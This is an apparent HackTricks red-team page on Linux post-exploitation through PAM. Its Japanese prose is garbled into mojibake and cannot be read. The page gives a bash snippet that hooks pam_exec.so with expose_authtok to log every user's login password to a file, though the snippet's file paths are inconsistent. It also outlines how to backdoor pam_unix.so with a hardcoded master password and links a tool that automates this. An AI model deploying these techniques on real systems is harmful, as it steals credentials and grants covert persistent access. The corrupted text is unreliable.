# Linux Post-Exploitation

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

## PAMã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚ªãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å—…ã

PAMãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’æ§‹æˆã—ã¦ã€å„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã«ä½¿ç”¨ã™ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¨˜éŒ²ã™ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚PAMãŒä½•ã‹ã‚ã‹ã‚‰ãªã„å ´åˆã¯ã€æ¬¡ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

**è©³ç´°ã«ã¤ã„ã¦ã¯ã€[å…ƒã®æŠ•ç¨¿](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)ã‚’ç¢ºèªã—ã¦ãã ã•ã„**ã€‚ã“ã‚Œã¯è¦ç´„ã§ã™ï¼š

**æŠ€è¡“æ¦‚è¦:**
ãƒ—ãƒ©ã‚°å¯èƒ½èªè¨¼ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ï¼ˆPAMï¼‰ã¯ã€Unixãƒ™ãƒ¼ã‚¹ã®ã‚·ã‚¹ãƒ†ãƒ ã§èªè¨¼ã‚’ç®¡ç†ã™ã‚‹æŸ”è»Ÿæ€§ã‚’æä¾›ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã¯ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã‚’ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã—ã¦ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€èª¤ç”¨ã•ã‚Œã‚‹ã¨ãƒªã‚¹ã‚¯ã‚’ã‚‚ãŸã‚‰ã™ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã®è¦ç´„ã§ã¯ã€PAMã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³è³‡æ ¼æƒ…å ±ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹æŠ€è¡“ã¨ã€ç·©å’Œæˆ¦ç•¥ã«ã¤ã„ã¦æ¦‚èª¬ã—ã¦ã„ã¾ã™ã€‚

**è³‡æ ¼æƒ…å ±ã®ã‚­ãƒ£ãƒ—ãƒãƒ£:**
- `toomanysecrets.sh`ã¨ã„ã†åå‰ã®bashã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒä½œæˆã•ã‚Œã€ãƒ­ã‚°ã‚¤ãƒ³è©¦è¡Œã‚’è¨˜éŒ²ã—ã€æ—¥ä»˜ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åï¼ˆ`$PAM_USER`ï¼‰ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ï¼ˆstdinçµŒç”±ï¼‰ã€ãŠã‚ˆã³ãƒªãƒ¢ãƒ¼ãƒˆãƒ›ã‚¹ãƒˆIPï¼ˆ`$PAM_RHOST`ï¼‰ã‚’`/var/log/toomanysecrets.log`ã«ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¾ã™ã€‚
- ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯å®Ÿè¡Œå¯èƒ½ã«ãªã‚Šã€`pam_exec.so`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦PAMæ§‹æˆï¼ˆ`common-auth`ï¼‰ã«çµ±åˆã•ã‚Œã€é™ã‹ã«å®Ÿè¡Œã•ã‚Œã€èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚¹ã‚¯ãƒªãƒ—ãƒˆã«å…¬é–‹ã•ã‚Œã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒä»˜ã‘ã‚‰ã‚Œã¾ã™ã€‚
- ã“ã®æ‰‹æ³•ã¯ã€ä¾µå®³ã•ã‚ŒãŸLinuxãƒ›ã‚¹ãƒˆãŒæ‚ªç”¨ã•ã‚Œã¦è³‡æ ¼æƒ…å ±ã‚’æ§ãˆã‚ã«è¨˜éŒ²ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### PAMã¸ã®ãƒãƒƒã‚¯ãƒ‰ã‚¢è¨­ç½®

**è©³ç´°ã«ã¤ã„ã¦ã¯ã€[å…ƒã®æŠ•ç¨¿](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚ä»¥ä¸‹ã¯è¦ç´„ã§ã™ï¼š

Pluggable Authentication Moduleï¼ˆPAMï¼‰ã¯ã€Linuxã§ãƒ¦ãƒ¼ã‚¶ãƒ¼èªè¨¼ã«ä½¿ç”¨ã•ã‚Œã‚‹ã‚·ã‚¹ãƒ†ãƒ ã§ã™ã€‚**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã€**ã‚µãƒ¼ãƒ“ã‚¹**ã®3ã¤ã®ä¸»è¦ãªæ¦‚å¿µã«åŸºã¥ã„ã¦å‹•ä½œã—ã¾ã™ã€‚å„ã‚µãƒ¼ãƒ“ã‚¹ã®æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã¯`/etc/pam.d/`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚Šã€å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒèªè¨¼ã‚’å‡¦ç†ã—ã¾ã™ã€‚

**ç›®çš„**: PAMã‚’å¤‰æ›´ã—ã¦ã€ç‰¹å®šã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§èªè¨¼ã‚’è¨±å¯ã—ã€å®Ÿéš›ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ã»ã¨ã‚“ã©ã®ã‚µãƒ¼ãƒ“ã‚¹ã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æ¤œè¨¼ã«ä½¿ç”¨ã•ã‚Œã‚‹`common-auth`ãƒ•ã‚¡ã‚¤ãƒ«ã§ä½¿ç”¨ã•ã‚Œã‚‹`pam_unix.so`å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ç‰¹ã«ç„¦ç‚¹ã‚’å½“ã¦ã¦ã„ã¾ã™ã€‚

### `pam_unix.so`ã®å¤‰æ›´æ‰‹é †:

1. **`common-auth`ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®èªè¨¼ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’ç‰¹å®š**:
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹è²¬ä»»ãŒã‚ã‚‹è¡Œã¯`pam_unix.so`ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚
2. **ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®å¤‰æ›´**:
- `pam_unix_auth.c`ã‚½ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«ã«æ¡ä»¶ä»˜ãã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã‚’è¿½åŠ ã—ã€äº‹å‰å®šç¾©ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒä½¿ç”¨ã•ã‚ŒãŸå ´åˆã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã€ãã‚Œä»¥å¤–ã®å ´åˆã¯é€šå¸¸ã®èªè¨¼ãƒ—ãƒ­ã‚»ã‚¹ã‚’ç¶šè¡Œã—ã¾ã™ã€‚
3. **å¤‰æ›´ã—ãŸ`pam_unix.so`ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’å†ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¦ç½®ãæ›ãˆã‚‹**ã€‚
4. **ãƒ†ã‚¹ãƒˆ**:
- äº‹å‰å®šç¾©ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€é€šå¸¸ã®èªè¨¼ãƒ—ãƒ­ã‚»ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆãšã«ã€ã•ã¾ã–ã¾ãªã‚µãƒ¼ãƒ“ã‚¹ï¼ˆãƒ­ã‚°ã‚¤ãƒ³ã€sshã€sudoã€suã€ã‚¹ã‚¯ãƒªãƒ¼ãƒ³ã‚»ãƒ¼ãƒãƒ¼ï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ãŒè¨±å¯ã•ã‚Œã¾ã™ã€‚

{% hint style="info" %}
[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)ã‚’ä½¿ç”¨ã—ã¦ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’è‡ªå‹•åŒ–ã§ãã¾ã™ã€‚
{% endhint %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨å®Ÿè·µ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
